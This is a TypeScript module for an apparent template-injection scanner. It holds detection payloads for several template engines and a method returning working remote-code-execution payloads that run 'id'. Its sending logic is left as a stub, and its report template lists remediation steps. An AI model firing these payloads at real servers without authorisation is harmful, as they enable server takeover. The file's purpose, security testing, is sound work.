/**
 * SSTI Hunter Agent
 * 
 * Specialized mini-agent for discovering Server-Side Template Injection vulnerabilities.
 * Tests for unsafe template rendering in various template engines.
 */

export interface SSTITest {
  url: string;
  parameter: string;
  method: 'GET' | 'POST';
  location: 'query' | 'body' | 'header';
}

export interface SSTIVulnerability {
  url: string;
  parameter: string;
  payload: string;
  templateEngine: string;
  severity: 'high' | 'critical';
  description: string;
  evidence: string;
  rcePayload?: string;
}

/**
 * SSTI detection payloads for various template engines
 */
const SSTI_PAYLOADS: Record<string, string[]> = {
  jinja2: [
    '{{7*7}}',
    '{{config}}',
    '{{self}}',
    "{{''.__class__.__mro__[1].__subclasses__()}}",
  ],
  twig: [
    '{{7*7}}',
    '{{_self}}',
    '{{dump(app)}}',
  ],
  freemarker: [
    '${7*7}',
    '#{7*7}',
    '${"freemarker.template.utility.Execute"?new()}',
  ],
  velocity: [
    '#set($x=7*7)$x',
    '$class.inspect("java.lang.Runtime")',
  ],
  smarty: [
    '{$smarty.version}',
    '{php}echo 7*7;{/php}',
  ],
  erb: [
    '<%= 7*7 %>',
    '<%= system("id") %>',
  ],
  handlebars: [
    '{{7*7}}',
    '{{this}}',
  ],
};

export class SSTIHunter {
  private baseUrl: string;

  constructor(baseUrl: string) {
    this.baseUrl = baseUrl;
  }

  /**
   * Test endpoint for SSTI vulnerabilities
   */
  async testEndpoint(test: SSTITest): Promise<SSTIVulnerability[]> {
    const vulnerabilities: SSTIVulnerability[] = [];

    for (const [engine, payloads] of Object.entries(SSTI_PAYLOADS)) {
      for (const payload of payloads) {
        const vuln = await this.testPayload(test, engine, payload);
        if (vuln) {
          vulnerabilities.push(vuln);
        }
      }
    }

    return vulnerabilities;
  }

  private async testPayload(
    test: SSTITest,
    engine: string,
    payload: string
  ): Promise<SSTIVulnerability | null> {
    // TODO: Implement SSTI testing
    // 1. Send payload to parameter
    // 2. Check if payload was evaluated (e.g., 7*7 = 49)
    // 3. Identify template engine
    // 4. Test for RCE
    return null;
  }

  /**
   * Identify template engine from response
   */
  private identifyEngine(response: string, payload: string): string | null {
    // Check for evaluated expressions
    if (payload.includes('7*7') && response.includes('49')) {
      // Further identification needed
      if (payload.includes('{{')) return 'jinja2/twig';
      if (payload.includes('${')) return 'freemarker';
      if (payload.includes('#set')) return 'velocity';
      if (payload.includes('<%=')) return 'erb';
    }

    return null;
  }

  /**
   * Generate RCE payload for identified engine
   */
  generateRCEPayload(engine: string): string {
    const rcePayloads: Record<string, string> = {
      jinja2: "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
      twig: '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
      freemarker: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
      velocity: '#set($x=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))$x',
      erb: '<%= system("id") %>',
    };

    return rcePayloads[engine] || '';
  }

  /**
   * Generate proof of concept
   */
  generatePoC(vuln: SSTIVulnerability): string {
    return `
# Server-Side Template Injection Vulnerability

**URL:** ${vuln.url}
**Parameter:** ${vuln.parameter}
**Template Engine:** ${vuln.templateEngine}
**Severity:** ${vuln.severity.toUpperCase()}

## Description:
${vuln.description}

## Detection Payload:
\`\`\`
${vuln.payload}
\`\`\`

## Evidence:
${vuln.evidence}

${vuln.rcePayload ? `## RCE Payload:
\`\`\`
${vuln.rcePayload}
\`\`\`
` : ''}

## Impact:
Server-Side Template Injection can lead to:
- Remote Code Execution (RCE)
- Full server compromise
- Data exfiltration
- Privilege escalation

## Remediation:
1. Never pass user input directly to template engines
2. Use sandboxed template environments
3. Implement strict input validation
4. Use logic-less template engines when possible
5. Apply principle of least privilege to template execution
    `.trim();
  }
}

export default SSTIHunter;